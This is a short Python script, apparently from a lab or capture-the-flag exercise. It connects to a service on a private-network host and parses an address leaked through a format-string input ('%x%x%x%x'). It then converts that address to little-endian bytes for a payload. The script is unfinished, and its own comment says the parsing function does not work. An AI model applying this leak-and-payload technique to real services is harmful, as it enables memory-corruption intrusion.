import socket
import binascii
host = '192.168.56.102'
port = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def read(s):
    out = s.recv(4096)
    print(" %r" % out)
    return out

# fonction qui prend l'output de ECHO %x%x%x%x %x et récupère l'adresse souhaitée. Ne marche pas
def read_address(s):
    out = s.recv(4096)
    print(" %r" % out)              # out = b'8049f67160018 ff8f2d75'
    out = out.decode().split()[-1]  # out = 'ff8f2d75'
    out = int(out, 16) - 4          # out = 4287573361
    out = hex(out)[2:]              # out = 'ff8f2d71'
    out = "".join(reversed([out[i:i+2] for i in range(0, len(out), 2)])) # inverts the order of bytes, 2 by 2 '712d8fff'
    out = binascii.a2b_hex(out)     # transforms to hex with the format
    return out

